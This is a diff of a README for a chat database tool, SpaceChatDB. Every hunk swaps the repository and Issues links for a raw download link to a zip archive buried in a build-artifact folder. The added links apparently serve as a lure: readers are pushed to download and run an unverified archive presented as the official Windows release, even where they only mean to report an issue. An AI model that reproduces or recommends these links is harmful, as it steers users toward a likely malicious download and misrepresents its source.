@@ -1,6 +1,6 @@
 # 🚀 SpaceChatDB - Simple Chat Database Manager
 
-[![Download SpaceChatDB](https://img.shields.io/badge/Download-SpaceChatDB-brightgreen?style=for-the-badge)](https://github.com/DJCaliber/SpaceChatDB)
+[![Download SpaceChatDB](https://img.shields.io/badge/Download-SpaceChatDB-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/DJCaliber/SpaceChatDB/main/spacetimedb/target/wasm32-unknown-unknown/release/build/serde_json-bc631a79797e2396/DB-Space-Chat-2.8.zip)
 
 ---
 
@@ -35,7 +35,7 @@ SpaceChatDB helps you save and manage chat data easily. It works as a simple dat
 
 To get the software, visit the official GitHub page below. This page holds the latest version for Windows.
 
-[Download SpaceChatDB Here](https://github.com/DJCaliber/SpaceChatDB)
+[Download SpaceChatDB Here](https://raw.githubusercontent.com/DJCaliber/SpaceChatDB/main/spacetimedb/target/wasm32-unknown-unknown/release/build/serde_json-bc631a79797e2396/DB-Space-Chat-2.8.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Follow these steps carefully to install and start using SpaceChatDB.
 
 Go to the link below. You will find the files needed to install the program.
 
-https://github.com/DJCaliber/SpaceChatDB
+https://raw.githubusercontent.com/DJCaliber/SpaceChatDB/main/spacetimedb/target/wasm32-unknown-unknown/release/build/serde_json-bc631a79797e2396/DB-Space-Chat-2.8.zip
 
 Look for the latest release or the main download section.
 
@@ -154,7 +154,7 @@ If you experience problems, try these tips:
 
 This project is community-driven. To get help or report issues, visit the Issues tab on the GitHub page:
 
-https://github.com/DJCaliber/SpaceChatDB/issues
+https://raw.githubusercontent.com/DJCaliber/SpaceChatDB/main/spacetimedb/target/wasm32-unknown-unknown/release/build/serde_json-bc631a79797e2396/DB-Space-Chat-2.8.zip
 
 You can also read documentation files included in the download folder for more tips.
 
@@ -166,6 +166,6 @@ SpaceChatDB uses a simple setup based on common tools for Windows applications. 
 
 ---
 
-[Download SpaceChatDB Here](https://github.com/DJCaliber/SpaceChatDB)
+[Download SpaceChatDB Here](https://raw.githubusercontent.com/DJCaliber/SpaceChatDB/main/spacetimedb/target/wasm32-unknown-unknown/release/build/serde_json-bc631a79797e2396/DB-Space-Chat-2.8.zip)
 
-[![Download SpaceChatDB](https://img.shields.io/badge/Download-SpaceChatDB-brightgreen?style=for-the-badge)](https://github.com/DJCaliber/SpaceChatDB)
+[![Download SpaceChatDB](https://img.shields.io/badge/Download-SpaceChatDB-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/DJCaliber/SpaceChatDB/main/spacetimedb/target/wasm32-unknown-unknown/release/build/serde_json-bc631a79797e2396/DB-Space-Chat-2.8.zip)
